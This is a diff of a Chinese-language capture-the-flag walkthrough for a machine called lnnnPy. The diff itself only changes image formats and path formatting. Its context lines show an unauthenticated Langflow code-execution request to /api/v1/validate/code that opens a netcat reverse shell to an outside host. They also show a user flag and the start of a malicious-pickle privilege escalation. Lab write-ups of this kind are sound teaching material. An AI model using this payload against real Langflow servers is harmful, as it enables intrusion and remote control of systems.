@@ -37,7 +37,7 @@ Nmap done: 1 IP address (1 host up) scanned in 15.33 seconds
 
 这里虽然有80和7860两个web端口，但是进去的内容都是一样的，都是一个叫langflow的东西的面板，进去也也没有验证，点开右上角可以看到版本
 
-![ref1](/assets/images/2026-06-21-lnnnPy-walkthrough/ref1.png)
+![ref1](/assets/images/2026-06-21-lnnnPy-walkthrough/ref1.webp)
 
 搜索一下可以发现，1.3.0之前存在一个RCE漏洞，可以利用/api/v1/validate/code这个地址进行RCE，下面是poc
 
@@ -52,7 +52,7 @@ Content-Length: 125
 
 测试一下，存在RCE，因此直接反弹shell
 
-![ref2](/assets/images/2026-06-21-lnnnPy-walkthrough/ref2.png)
+![ref2](/assets/images/2026-06-21-lnnnPy-walkthrough/ref2.webp)
 
 ```http
 POST /api/v1/validate/code HTTP/1.1
@@ -70,7 +70,7 @@ Content-Length: 107
 {"code": "@exec('raise Exception(__import__(\"subprocess\").check_output(`[\"busybox\", \"nc\", \"192.168.5.44\", \"4444\", \"-e\", \"/bin/bash\"]`))')\ndef foo():\n  pass"}
 ```
 
-在/home/lnnn里拿到user flag
+在`/home/lnnn`里拿到user flag
 
 ```bash
 cat user.txt
@@ -79,7 +79,7 @@ lnnn{w3lc0me_t0_lnnn_w0rksh0p_y0u_g0t_u53r}
 
 # Root
 
-查看一下家目录的其它文件，这应该是个提示，说明有脚本或程序监控/home/lnnn/models/这个文件夹
+查看一下家目录的其它文件，这应该是个提示，说明有脚本或程序监控`/home/lnnn/models/`这个文件夹
 
 ```bash
 cat README.txt 
@@ -213,7 +213,7 @@ if __name__ == '__main__':
 
 ```
 
-可以看到，这个脚本会把/home/lnnn/models下的.pkl文件，全部调用pickle.load加载，所以就可以构造恶意的pickle文件，进行反序列化提权，恶意脚本
+可以看到，这个脚本会把`/home/lnnn/models`下的.pkl文件，全部调用pickle.load加载，所以就可以构造恶意的pickle文件，进行反序列化提权，恶意脚本
 
 ```python
 import pickle
